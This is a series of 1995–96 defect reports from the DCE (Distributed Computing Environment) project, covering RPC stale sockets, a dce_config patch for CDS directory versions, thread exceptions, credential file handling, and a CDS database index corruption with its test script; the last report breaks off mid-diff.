the server has gone away.  I have tested this scenario, and confirmed that
the client does indeed recognize that the server has disappearred (after
about a 30 second wait)..This scenario can be easily recreated with a simple 
client/server example that uses context handles.  After the client has obtained 
a context handle,and the server is keeping state on the client, either 
a)reboot the clientsystem, or b) disconnect the network cable from the client 
machine.

I have a simple testcase to demonstrate this if required..

[6/8/95]

This same problem is now being seen with idl pipes.  When the client is
disconnected from the server, and the server is doing a pull pipe, it never
detects that the client is gone, and just hangs.  The symptoms are the same,
and the same steps as given previously were used to verify that the same
thing is happening.  

I am raising the severity and priority of this defect, given that it is now
seen as a problem with no workaround by 2 of our customers, and because it
is happening via two different scenarios now.

As with the context handles problem, a simple testcase using a server pull pipe
will recreate the problem, if the client's machine is rebooted, or the client's
machine is abruptly removed from the network (ie pull the network cable).

I have a testcase that demonstrates the problem, if necessary.

[8/18/95 public]

Hello Grant, please check out OT# 13023 and let us know if that fixes
your problem.

[8/22/95]

I am confident that defect 13023 will NOT help with this defect.  The focus
of this defect (12904) is the fact that when the clients NETWORK goes away,
the servers NETWORK gets no indication that the client is gone.  If the servers
network thinks the client connection is still present, then the server process
will NEVER get an indication that it should clean up the stale sockets, because
the server process RPC runtime is not set up to poll inactivity on its sockets.
The reason it works over UDP is because the server is actively pinging the
client to see if it is still around, and if the client doesn't respond after a
certain period of time, the server assumes the client is gone, and cleans up
the stale sockets associated with that client process.  TCP Clients, however,
do not have this problem, because they set the SO_KEEPALIVE option on all
of the sockets they create, so the client will detect a server network crash.
The RPC runtime does not set the SO_KEEPALIVE option on server process sockets
it obtains via an accept() call.

Here is another example of a problem we are having with a customer, that
hopefully will illustrate how large of a problem this is becoming.

This problem is becoming more and more visible.  We have a customer who has
hundreds of DCE clients running on laptop computers.  These laptops are
being used by people who log in and out many times a day, and when they log
out, they just hang up the phone, and/or turn the computer off.  They
are not willing to accept a workaround of "just use UDP".  This customer
has a production cell with over 1000 client machines, and bangs heavily on
DCE at all hours of the day.  The build up of stale sockets causes considerable
memory growth in the server processes, since there is a lot of baggage to
maintain in order to keep track of an association in the RPC runtime.  A DCE
core server will grow to a size of about 50 Meg in a matter of a few days.

[8/22/95 public]

Setting SO_KEEPALIVE on a server socket can be done in
rpc__cn_network_select_dispatch() (right after rpc__naf_set_pkt_nodelay(),
call rpc__socket_set_keepalive()). However, it will take 2 hours and 10
minutes for BSD TCP/IP implementation to notice the disconnection.
Depending on how many client contexts are hanging around, this may not
reduce the process size. Pinging a client makes sense, but it requires the
wire protocol change.

[8/28/95 public]
Bumped up priority to have it addressed promptly.

[09/20/95 public]
After some (off-line) discussion, IBM Digital and OSF all agree that there
is an architectural issue with CN RPC that doesn't detect disconnected
clients quickly enough.  Using SO_KEEPALIVE helps, but the time period is
too long for some (many, all...) environments.  A full resolution of this
is outside of the scope of the current release, and will probably require
protocol changes, AES and compatibility issues, and so on.



CR Number                     : 12901
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13135
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dce_config
Short Description             : Need to allow initial cell config with 4.0 directory version
Reported Date                 : 6/2/95
Found in Baseline             : 1.1
Found Date                    : 6/2/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : dce_config, dce_config_env, config.env
Sensitivity                   : public

[6/2/95 public]

Although it is possible to set the default directory version for
new directories to 4.0 by starting cdsd with the -v option, it is
not currently possible to do this within dce_config during an
initial cell configuration.  As this is one situation where one
could safely set the default to this level (since the initial set
of directories and all directories created thereafter would be at
4.0), it seems reasonable to provide a mechanism within dce_config
to allow this.

Accomplishing this would require a modification to the config_cds
function to check for a default directory version and pass it to
cdsd via the -v option during initialization.  It would also
require some way of restricting the use of a 4.0 default to the
initial CDS configuration (there are many ways this could be done, 
e.g., environment variables, user dialogs, etc.).

[10/2/95 public]

Changing this from an enhancement to a defect and raising the
severity to B.  Further investigation of other issues related to
upgrading CDS directory versions has revealed that there is
currently no way to upgrade the CDS_DirectoryVersion attribute
for a clearinghouse and hence the default CDS_DirectoryVersion 
for any new directory created with its master replica in that 
particular clearinghouse (see CR #13135 for further details).
While it would not totally eliminate the problem, modifying
dce_config to allow a default CDS_DirectoryVersion of 4.0 would
alleviate many of the instances where this issue might arise.

[11/03/95 public]

Fix (contributed by Spike White of HaL Software Systems) prompts for 
entry of default directory version during CDS config:

> *** /project/dce/build/dce1.1-maint/src/config/dce_config       Mon Jun  5 17:39
> :09 1995
> --- config/dce_config   Fri Oct  6 19:24:34 1995
> ***************
> *** 4441,4447 ****
>   #         the security server.
>   #     Perform config_basecds() routine (which is the same 
>   #           whether this is the 1st or Nth CDS server)
> ! #       Start cdsd -a
>   #     Configure the GDA
>   #     Ensure the user is in the cds-admin group, re-authenticating
>   #         if necessary.
> --- 4441,4447 ----
>   #         the security server.
>   #     Perform config_basecds() routine (which is the same 
>   #           whether this is the 1st or Nth CDS server)
> ! #       Start cdsd -a -v $CDSD_DIRECTORY_VERSION
>   #     Configure the GDA
>   #     Ensure the user is in the cds-admin group, re-authenticating
>   #         if necessary.
> ***************
> *** 4487,4492 ****
> --- 4487,4494 ----
>   
>         config_basecds
>   
> +       get_cds_default_dir_version
> + 
>         # Start the cdsd daemon (with -a option)
>         log_msg SUMMARY "Starting cdsd..."
>         ps ${PSARGS} | grep -q cdsd
> ***************
> *** 4496,4504 ****
>                 return
>         fi
>   
> !       log_msg DETAIL "Executing: cdsd -a"
> !         cdsd -a || { err_exit "cdsd failed to start"; } 
> !       modify_rcfile cdsd
>         verify_cds              # make sure cds is up and running
>   
>         # Set BIND_PE_SITE back for further config
> --- 4498,4506 ----
>                 return
>         fi
>   
> !       log_msg DETAIL "Executing: cdsd -a -v ${CDSD_DIRECTORY_VERSION}"
> !         cdsd -a -v ${CDSD_DIRECTORY_VERSION} || { err_exit "cdsd failed to sta
> rt"; } 
> !       modify_rcfile cdsd " -v ${CDSD_DIRECTORY_VERSION}"
>         verify_cds              # make sure cds is up and running
>   
>         # Set BIND_PE_SITE back for further config
> ***************
> *** 4525,4530 ****
> --- 4527,4587 ----
>   }
>   
>   #------------------------------------------------------
> + # get_cds_default_dir_version
> + #
> + # Accepts input from user for the default directory version to use with
> + # the cdsd process we're about to start.  Sets the appropriate environment
> + # variable ($CDSD_DIRECTORY_VERSION) to this value.
> + #
> + #------------------------------------------------------
> + #
> + get_cds_default_dir_version() {
> + 
> + log_msg WARNING "
> + DCE V1.1 CDS servers support two different directory versions: 
> +    version 3.0, which is compatible with existing DCE V1.0 cells, and
> +    version 4.0, which supports new V1.1 features such as cell aliasing,
> +       hierarchical cells and delegation ACLs.
> + 
> + If you are configuring this CDS server into an existing pre-1.1 cell, you 
> + should start this CDS server with a default directory version of 3.0. Also, 
> + if you intend to replicate any of this server's directories onto a pre-1.1 
> + CDS server, you should start this CDS server with a default directory version 
> + of 3.0.
> + 
> + Otherwise you should start up this CDS server (cdsd) with a default directory 
> + version of 4.0, in order to utilize the new V1.1 features.
> + " 
> + 
> + x_exit
> +  
> + if [ "$do_checks" = "y" ]; then
> +    log_msg VERBOSE "User query: Enter the default directory version for this
> + CDS server ($CDSD_DIRECTORY_VERSION)" 
> + 
> +    VERSION_LIST="3.0 4.0"
> +    while [ : ]; do
> +       echon "\tEnter the default directory version for this CDS server
> + ($CDSD_DIRECTORY_VERSION) " 
> +       read string
> +       if [ -z "${string}" ]; then
> +         string=$CDSD_DIRECTORY_VERSION
> +       fi
> +       case $string in
> +          [34].0) break;;
> +          *)
> +             echo "\t\t An invalid value was entered."
> +             echo "\t\t Valid values are: $VERSION_LIST"
> +             ;;
> +       esac
> +    done
> +    CDSD_DIRECTORY_VERSION=$string
> +    log_msg VERBOSE "User entry: $CDSD_DIRECTORY_VERSION"
> +    echo "User entry: $CDSD_DIRECTORY_VERSION"
> + fi
> + }
> + 
> + #------------------------------------------------------
>   # verify_cds()
>   #
>   # Checks to make sure cds is up and running
> ***************
> *** 5750,5755 ****
> --- 5807,5814 ----
>                 chk_cdscp "cdscp - \"define cached server\" command."
>         fi
>   
> +       get_cds_default_dir_version
> + 
>         # Start cdsd (withOUT the -a)
>         log_msg SUMMARY "Starting cdsd..."
>           ps ${PSARGS} | grep -q cdsd
> ***************
> *** 5767,5775 ****
>   
>           #
>           #
> !       log_msg DETAIL "Executing: cdsd"
> !         cdsd  || { err_exit "cdsd failed to start"; }
> !       modify_rcfile cdsd
>   
>           cds_replicate
>   
> --- 5826,5834 ----
>   
>           #
>           #
> !       log_msg DETAIL "Executing: cdsd -v ${CDSD_DIRECTORY_VERSION}"
> !         cdsd -v ${CDSD_DIRECTORY_VERSION} || { err_exit "cdsd failed to start"
> ; }
> !       modify_rcfile cdsd " -v ${CDSD_DIRECTORY_VERSION}"
>   
>           cds_replicate
  
Fix submitted to dce1.1-maint.

[01/24/96 public]

Revised version of fix which adds the ability to set the CDS directory
version via an environment variable.  Also sets a default level of
3.0 which must be explicitly changed (interactively or via environment
variable) during configuration.

> ./config/config.env
> Comparing revision 1.1.8.1 with revision 1.1.8.3.
> *** 1.1.8.1     1995/02/16 22:00:59
> --- 1.1.8.3     1996/01/19 21:40:56
> ***************
> *** 139,145 ****
>   #CACHE_CDS_SERVER_IP="<ip_address>" # fallback if getip program doesn't work
>   MULTIPLE_LAN=n                        # y/n do you have multiple lans
>   #LAN_NAME="<name>"            # Name of lan if MULTIPLE_LAN=y
> ! 
>   #REP_CLEARINGHOUSE="<name_ch>"        # Name for new replica clearing house
>   #DIR_REPLICATE="n"            # y/n manually type in more directories 
>                                 # to replicate.
> --- 143,149 ----
>   #CACHE_CDS_SERVER_IP="<ip_address>" # fallback if getip program doesn't work
>   MULTIPLE_LAN=n                        # y/n do you have multiple lans
>   #LAN_NAME="<name>"            # Name of lan if MULTIPLE_LAN=y
> ! CDSD_DIRECTORY_VERSION="4.0"  # Default directory version level
>   #REP_CLEARINGHOUSE="<name_ch>"        # Name for new replica clearing house
>   #DIR_REPLICATE="n"            # y/n manually type in more directories 
>                                 # to replicate.

> ./config/dce_config_env
> Comparing revision 1.1.11.6 with revision 1.1.15.1.
> *** 1.1.11.6    1994/08/29 19:45:15
> --- 1.1.15.1    1996/01/19 21:47:30
> ***************
> *** 119,125 ****
>         UNCONFIG_HOST_PRESET    CELL_NAME       CACHE_CDS_SERVER
>         CACHE_CDS_SERVER_IP     HOSTNAME_IP     REP_CLEARINGHOUSE
>         NTP_HOST                MULTIPLE_LAN    LAN_NAME
> !       CELL_ADMIN      TOLERANCE_SEC
>         check_time              DEFAULT_MAX_ID  UID_GAP
>         LOW_UID                 GID_GAP         LOW_GID
>         SYNC_CLOCKS             HPDCE_DEBUG     FILESYSTEM
> --- 123,129 ----
>         UNCONFIG_HOST_PRESET    CELL_NAME       CACHE_CDS_SERVER
>         CACHE_CDS_SERVER_IP     HOSTNAME_IP     REP_CLEARINGHOUSE
>         NTP_HOST                MULTIPLE_LAN    LAN_NAME
> !       CDSD_DIRECTORY_VERSION  CELL_ADMIN      TOLERANCE_SEC
>         check_time              DEFAULT_MAX_ID  UID_GAP
>         LOW_UID                 GID_GAP         LOW_GID
>         SYNC_CLOCKS             HPDCE_DEBUG     FILESYSTEM
> ***************
> *** 239,244 ****
> --- 243,254 ----
>   export LAN_NAME
>   # LAN_NAME: internal name of the lan (for use in the lan profile) when
>   # a user wishes to use multiple lans.  Used when configuring a cds server.
> + 
> + export CDSD_DIRECTORY_VERSION
> + # CDSD_DIRECTORY_VERSION: default directory version level to be used when 
> + # setting the CDS_DirectoryVersion attribute for a new clearinghouse.
> + # This attribute, in turn, sets the default directory version level for
> + # new directories created in that clearinghouse.
>   
>   celladmin=${CELL_ADMIN:="NULL"}
>   export CELL_ADMIN

> ./config/dce_config
> Comparing revision 1.2.63.2 with revision 1.2.63.4.
> *** 1.2.63.2    1995/06/05 21:52:36
> --- 1.2.63.4    1996/01/22 21:00:06
> ***************
> *** 4441,4447 ****
>   #         the security server.
>   #     Perform config_basecds() routine (which is the same 
>   #           whether this is the 1st or Nth CDS server)
> ! #       Start cdsd -a
>   #     Configure the GDA
>   #     Ensure the user is in the cds-admin group, re-authenticating
>   #         if necessary.
> --- 4449,4455 ----
>   #         the security server.
>   #     Perform config_basecds() routine (which is the same 
>   #           whether this is the 1st or Nth CDS server)
> ! #       Start cdsd -a -v $CDSD_DIRECTORY_VERSION
>   #     Configure the GDA
>   #     Ensure the user is in the cds-admin group, re-authenticating
>   #         if necessary.
> ***************
> *** 4487,4492 ****
> --- 4495,4502 ----
>   
>         config_basecds
>   
> +       get_cds_default_dir_version
> + 
>         # Start the cdsd daemon (with -a option)
>         log_msg SUMMARY "Starting cdsd..."
>         ps ${PSARGS} | grep -q cdsd
> ***************
> *** 4496,4504 ****
>                 return
>         fi
>   
> !       log_msg DETAIL "Executing: cdsd -a"
> !         cdsd -a || { err_exit "cdsd failed to start"; } 
> !       modify_rcfile cdsd
>         verify_cds              # make sure cds is up and running
>   
>         # Set BIND_PE_SITE back for further config
> --- 4506,4514 ----
>                 return
>         fi
>   
> !       log_msg DETAIL "Executing: cdsd -a -v ${CDSD_DIRECTORY_VERSION}"
> !         cdsd -a -v ${CDSD_DIRECTORY_VERSION} || { err_exit "cdsd failed to sta
> rt"; } 
> !       modify_rcfile cdsd " -v ${CDSD_DIRECTORY_VERSION}"
>         verify_cds              # make sure cds is up and running
>   
>         # Set BIND_PE_SITE back for further config
> ***************
> *** 4525,4530 ****
> --- 4535,4614 ----
>   }
>   
>   #------------------------------------------------------
> + # get_cds_default_dir_version
> + #
> + # Accepts input from user for the default directory version to use with
> + # the cdsd process we're about to start.  Sets the appropriate environment
> + # variable ($CDSD_DIRECTORY_VERSION) to this value.
> + #
> + #------------------------------------------------------
> + #
> + get_cds_default_dir_version()
> + {
> +     if [ "$do_checks" = "y" ]; then
> +         log_msg WARNING "
> +     DCE V1.1 CDS servers support two different directory versions: 
> +     version 3.0, which is compatible with existing DCE V1.0 cells, and
> +     version 4.0, which supports new V1.1 features such as cell aliasing,
> +     hierarchical cells and delegation ACLs.
> + 
> +     If you are configuring this CDS server into an existing pre-1.1 cell, 
> +     you should start this CDS server with a default directory version of 
> +     3.0.  Also, if you intend to replicate any of this server's directories 
> +     onto a pre-1.1 CDS server, you should start this CDS server with a 
> +     default directory version of 3.0.
> + 
> +     Otherwise you should start up this CDS server (cdsd) with a default 
> +     directory version of 4.0, in order to utilize the new V1.1 features.
> + " 
> + 
> +     x_exit
> +     fi
> +  
> +     VERSION_LIST="3.0 4.0"
> + 
> +     CDSD_DIRECTORY_VERSION=${CDSD_DIRECTORY_VERSION:="NULL"}
> + 
> +     case $CDSD_DIRECTORY_VERSION in
> +         [34].0)
> +             break;;
> +         *)
> +             if [ "${CDSD_DIRECTORY_VERSION}" != "NULL" ]
> +             then
> +                 echo "\n\t Environment variable CDSD_DIRECTORY_VERSION is set 
> to an invalid value."
> +                 echo "\t Valid values are: $VERSION_LIST"
> +                 CDSD_DIRECTORY_VERSION="NULL"
> +             fi
> + 
> +             while [ "${CDSD_DIRECTORY_VERSION}" = "NULL" ]
> +             do
> +                 TEMP_CDSD_DIRECTORY_VERSION="3.0"
> +                 log_msg VERBOSE "User query: Enter the default directory versi
> on for this CDS server ($TEMP_CDSD_DIRECTORY_VERSION)" 
> +                 echon "\n\tEnter the default directory version for this CDS se
> rver ($TEMP_CDSD_DIRECTORY_VERSION)" 
> +                 read string
> +     
> +                 if [ -z "${string}" ]
> +                 then
> +                     string=$TEMP_CDSD_DIRECTORY_VERSION
> +                 fi
> + 
> +                 case $string in
> +                     [34].0)
> +                         CDSD_DIRECTORY_VERSION=$string
> +                         break;;
> +                     *)
> +                         echo "\n\t An invalid value was entered."
> +                         echo "\t Valid values are: $VERSION_LIST";;
> +                 esac
> + 
> +             done;;
> +     esac
> + 
> +     log_msg VERBOSE "User entry: $CDSD_DIRECTORY_VERSION"
> +     echo "\n\tUser entry: $CDSD_DIRECTORY_VERSION\n"
> + }
> + 
> + #------------------------------------------------------
>   # verify_cds()
>   #
>   # Checks to make sure cds is up and running
> ***************
> *** 5750,5755 ****
> --- 5834,5841 ----
>                 chk_cdscp "cdscp - \"define cached server\" command."
>         fi
>   
> +       get_cds_default_dir_version
> + 
>         # Start cdsd (withOUT the -a)
>         log_msg SUMMARY "Starting cdsd..."
>           ps ${PSARGS} | grep -q cdsd
> ***************
> *** 5767,5775 ****
>   
>           #
>           #
> !       log_msg DETAIL "Executing: cdsd"
> !         cdsd  || { err_exit "cdsd failed to start"; }
> !       modify_rcfile cdsd
>   
>           cds_replicate
>   
> --- 5853,5861 ----
>   
>           #
>           #
> !       log_msg DETAIL "Executing: cdsd -v ${CDSD_DIRECTORY_VERSION}"
> !         cdsd -v ${CDSD_DIRECTORY_VERSION} || { err_exit "cdsd failed to start"
> ; }
> !       modify_rcfile cdsd " -v ${CDSD_DIRECTORY_VERSION}"
>   
>           cds_replicate
>   

Update to original fix submitted to dce1.1-maint.



CR Number                     : 12896
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : cma_signal.c
Short Description             : On SVR4 system exception causes core dumps
Reported Date                 : 6/1/95
Found in Baseline             : 1.1
Found Date                    : 6/1/95
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : threads/SVR4/cma_signal.c
Sensitivity                   : public

[6/1/95 public]

From customer:

This defect affects only SVR4 ports.

There is a #define _CMA_SYNC_KILL_ in file cma_signal.c. This causes
exceptions to cause directly a core dump and CATCH/TRY not to work.

This is an example Program:

#include <dce/pthread_exc.h>

main()
{
int i;
	TRY
	{
		i = 5/0;	
	}
	
	CATCH (exc_fltdiv_e)
	{
    	printf("Main : caught exception exc_fltdiv_e\n");
	}
	CATCH_ALL
	{
    	printf("Main : Unexpected exception\n");
	}
	ENDTRY
}



CR Number                     : 12895
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : security
Short Description             : Usage of old context when a new context is set
Reported Date                 : 5/31/95
Found in Baseline             : 1.1
Found Date                    : 5/31/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/31/95 public]

Dawn Stokes at IBM observed the /opt/dcelocal/var/security/creds dir
had many obsolete creds files for the various dfs servers and found
that to an error in the dfsauth package. 

While reading the security code for set_login_set_context to look at
Dawn's suggested fix, I observed that when set_login_set_context is
called when one already has a current context, the code creates a new
dcecred_XXXXXXXX, dcecred_XXXXXXXX.data files for the new context that
are hardlinks to the dcecred files (say dcecred_YYYYYYYY*) for the
current context.  Then the routine that writes out the new login
context writes it into a temporary file and then renames it atomically
over dcecred_XXXXXXXX file effectively orphaning the dcecred_YYYYYYYY
files which seems unintuitive. Clearly the hardlinks created suggest
that any old users of the current (old) context will somehow fallover
to using the new context but the rename operation clearly prevents
that. So its self-inconsistent. 

Is this the desired behaviour?

[5/31/95 public]

This defect looks interesting. I have heard somewhat related problem
from another customer:

> On command line:
> dce_login <princ> <princ_passwd>
>
> Sometime later:
> I want to run a utility within the context of the earlier shell that will
> extend my expiration time.
>
> For this I could use kinit, but cant because kinit does some funny things
> with the tty to read the passwd. Hence I am trying to use a very simple
> program. The program takes as an argument the passwd for the currently 
> logged in context.
>
> The steps are:
> - Get the login context
> - Refresh the context using
>      sec_login_refresh_identity (inherited context,  status)
>   If the status is okay, and now it is, then
>      sec_login_validate_identity(lc, ....) using the passwd string.
>
> I set the current login context after validating. But this step is noise
> because there is no difference whether I set the context or not.
>
> Now when I run this program, I have no problem at all. There are no errors.
> When I exit the program, and run klist I see no change in the expiration
> time for the  krbtgt, or the ticket granting ticket.
>
> But If I do this process using kinit, I can see the change in the krbtgt time.
>
> What am I doing wrong ?



CR Number                     : 12889
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : 
Short Description             : A 1.1 client restricted to the DG
protocol isn't able to config against a 1.0.x server
Reported Date                 : 4/04/95
Found in Baseline             : 1.1
Found Date                    : 4/06/95
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : client/rca/priv.c
Sensitivity                   : public

[5/26/95 public]

(from Tom Jordahl @ Gradient)

If a 1.1 client is restricted to the DG protocol, it is unable to config
against a 1.0.x server.  In the 1.1 security code (src/client/rca/priv.c) 
it is assumed that you will get back either an rpc_s_unknown_if, or
ept_s_not_registered status back from an attempt to bind to a 1.0.x
secd.  It seems that if DG is used, the rpcd will drop the packets with
an idl 1.1 interface version, and the status returned is comm_failure.

Repeat by:

Config a 1.1 client with RPC_SUPPORTED_PROTSEQS=ncadg_ip_udp against
a 1.0.x server

Proposed Solution:

Check for comm_failure and try the 1.0 interface?
Doesn't seem like a great idea...



CR Number                     : 12882
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : krb
Short Description             : superfluous file in sources/build
Reported Date                 : 5/22/95
Found in Baseline             : 1.1
Found Date                    : 5/22/95
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 1.1maint
Affected File(s)              : security/krb5/lib/krb5/Makefile
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/22/95 public]


 In security/krb5/lib/krb, the file in_tkt_sky.c is no longer needed
 in the build (not to mention containing bogus code!).
Related-file::Added 950403 by rusman::
/build/hiosfm/RCS/dce1.1/src/security/krb5/lib/krb5/./Makefile,v 8.3
 /build/hiosfm/RCS/dce1.1/src/security/krb5/lib/krb5/./Makefile,v 8.3
 rusman 1995/04/03 13:19:12 +3 -3
 Reason:  OSDqa11096 superfluous file in sources/build
 remove in_tkt_sky.o from build
 
     *** /tmp/ci.13168..Makefile.13202.1        Mon Apr  3 09:19:15 1995
     --- /tmp/Makefile.13202.2  Mon Apr  3 09:19:15 1995
     ***************
     *** 149,159 ****
        copy_princ.o copy_tick.o cp_key_cnt.o decode_kdc.o decrypt_tk.o \
        encode_kdc.o encrypt_tk.o free_rtree.o faddr_ordr.o \
        gc_2tgt.o gc_frm_kdc.o gc_via_tgt.o gen_rname.o \
               gen_subkey.o get_creds.o get_in_tkt.o
       libkrb5b_OFILES  = \
     !  in_tkt_pwd.o in_tkt_sky.o kdc_rep_dc.o krbconfig.o \
        mk_error.o mk_priv.o mk_rep.o mk_req.o mk_req_ext.o \
        mk_safe.o parse.o preauth.o pr_to_salt.o princ_comp.o \
        rd_error.o rd_priv.o \
        rd_rep.o rd_req.o rd_req_sim.o  rd_req_dec.o rd_safe.o  \
        send_tgs.o tgtname.o unparse.o walk_rtree.o \
     --- 149,159 ----
        copy_princ.o copy_tick.o cp_key_cnt.o decode_kdc.o decrypt_tk.o \
        encode_kdc.o encrypt_tk.o free_rtree.o faddr_ordr.o \
        gc_2tgt.o gc_frm_kdc.o gc_via_tgt.o gen_rname.o \
               gen_subkey.o get_creds.o get_in_tkt.o
       libkrb5b_OFILES  = \
   !  in_tkt_pwd.o kdc_rep_dc.o krbconfig.o \
        mk_error.o mk_priv.o mk_rep.o mk_req.o mk_req_ext.o \
        mk_safe.o parse.o preauth.o pr_to_salt.o princ_comp.o \
        rd_error.o rd_priv.o \
        rd_rep.o rd_req.o rd_req_sim.o  rd_req_dec.o rd_safe.o  \
        send_tgs.o tgtname.o unparse.o walk_rtree.o \

[3/11/96 public]
A redundant file that's useless but not causing any harm doesn't warrant
a C3 rating.  I've downgraded this to E4.



CR Number                     : 12879
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12987
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cdsd
Short Description             : database index corruption after creates/deletes
Reported Date                 : 5/19/95
Found in Baseline             : 1.1
Found Date                    : 5/19/95
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 1.1maint
Affected File(s)              : 
Sensitivity                   : public

[5/19/95 public]

Symptoms:
  A suite of tests which includes a procedure which creates and
  deletes objects whose names are generated from random numbers.
  During this procedure, these objects are listed.
  After about 40 hours, the list command hangs with the server
  in a hard loop in build_name_set().

  This problem is reproducible with a more direct test script,
  which is included below.  This script takes several hours to
  stumble across the problem, and it does not always encounter
  it in the same way.  Stopping and restarting cdsd after the
  test and trying "cdscp list obj /.:/*" sometimes makes the
  problem apparent.  Passing this test several times
  sequentially would be excellent evidence of a good fix.

Severity:
  This problem hangs our Continuous Hours of Operation tests on
  every run.  It is blocking our ability to adequately test our
  system for release.

Analysis:
  Stepping through the code, we discovered that db_entry_read_next()
  was facilitating the loop by cycling back over 6 names. This was
  due to an index entry, pointing to an empty data bucket, whose
  next pointer pointed to entries which were in earlier lexical order
  to the index key.
  e.g. key 29121 pointed to empty bucket, which pointed to a bucket
  containing 27590, 28019, etc.

  It is easy to verify that once all items are purged from a bucket,
  an orphan key like this results. Thereafter, the code does not
  use this bucket, but advances to a following non-empty bucket
  before making its insertion. At this point, data buckets are still
  in order, but the index is inconsistent. If we extend this,
  such that that bucket splits, it is possible for the index itself
  to start containing out-of-order keys when the new keys are inserted.

  When we further examined the index, we did find index corruptions
  like this.

Solution:
  There seem to be two approaches to solving this.

  1) Re-use the empty buckets. This would be complicated because
     of code which might not have the key for that empty bucket
     when insertion takes place.

  2) Delete buckets as they become empty. This is already attempted
     in db_btree_remove_entry(), but the algorithm has to be extended
     to remove not only orphaned index entries, but if an index bucket
     becomes empty by this action, the algorithm is propagated up the tree.

Test Script:
    #!/bin/ksh
    # @HP_COPYRIGHT@
    integer OUTER_LOOP=0
    while (( $OUTER_LOOP < 25 ))
    do
       touch /tmp/cdstestcmds
       integer INNER_LOOP=0
       while (( $INNER_LOOP < 1000 ))
       do
          ENTRY_NAME="/.:/new_server_$RANDOM"
          echo "create object $ENTRY_NAME" >> /tmp/cdstestcmds
          echo "delete object $ENTRY_NAME" >> /tmp/cdstestcmds
          INNER_LOOP=INNER_LOOP+1
       done
       echo "set dir /.: to skulk" >> /tmp/cdstestcmds
       cat /tmp/cdstestcmds | cdscp > /dev/null
       rm /tmp/cdstestcmds
       cdscp list obj "/.:/*" > /dev/null
       OUTER_LOOP=OUTER_LOOP+1
       echo "test cycle $OUTER_LOOP complete"
    done

[7/19/95 public]

Customer believes that this report is not complete because the problem 
is not just with empty buckets, it's with buckets that have their last 
entry deleted, thus rendering the key in the index obsolete.  (Well, 
that's true in 1.0.3, so it's probably true in 1.1 -- the code in 1.1 
that's supposed to do things like rebuild the index can never be invoked.)

[8/2/95 public]

See OT 12987 for a possible fix to this problem.

[01/24/96 public]

Fixed in 1.1maint; fix provided by Alan Peckham.



CR Number                     : 12878
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : child
Short Description             : cdsclerk improper locking can leave dangling pointers
Reported Date                 : 5/18/95
Found in Baseline             : 1.1
Found Date                    : 5/18/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : directory/cds/child/clerk_client.c, directory/cds/child/clerk_bind.c
Sensitivity                   : public

[5/18/95 public]

A support customer noted:

> When parse_arguments calls free_inuse_cached_handle, no
> locks are being held.  That means that a second caller can come in and
> make the identical call.  Suppose the cache entry is unreferenced, and
> one of the threads succeeds in freeing the cache data.  Freeing
> includes doing a dns_free, so the same memory could now be reused.
> Now the other thread attempts to do the free, with disastrous results.
> 
> Just starting up and shutting down CDS
> many times will hit it sooner or later, especially with kernel threads
> on a multiprocessor.

The suggested fix for clerk_client.c is:

>      *** /tmp/ci.10024..clerk_client.c.10058.1	Fri Jan 27 16:30:47 1995
>      --- /tmp/clerk_client.c.10058.2	Fri Jan 27 16:30:47 1995
>      ***************
>      *** 903,913 ****
>        *parse_arguments (thread_t *th_p)
>        {
>        #if defined(DCE_SEC)
>            byte_t *p;
>            int    done;
>      !     handle_cache_t *cache_p;
>        #endif
>        
>            register byte_t **argPtr = th_p->clerkArgs;
>            register byte_t **endArg = &th_p->clerkArgs[MAX_ARGS];
>            register byte_t *reqPtr = th_p->clerkReqBuf_p;
>      --- 903,913 ----
>        *parse_arguments (thread_t *th_p)
>        {
>        #if defined(DCE_SEC)
>            byte_t *p;
>            int    done;
>      !     handle_cache_t *cache_p, *next_p;
>        #endif
>        
>            register byte_t **argPtr = th_p->clerkArgs;
>            register byte_t **endArg = &th_p->clerkArgs[MAX_ARGS];
>            register byte_t *reqPtr = th_p->clerkReqBuf_p;
>      ***************
>      *** 940,950 ****
>      --- 940,952 ----
>        	/* If arg 0 is non-0, save opaque login context */
>        	if (argcnt++ == 0) {
>        	    if (length > sizeof(field16)) {
>        
>        #if defined(DCE_SEC)
>      +               int thstatus;
>        
>      + 
>        	      done = FALSE;
>        
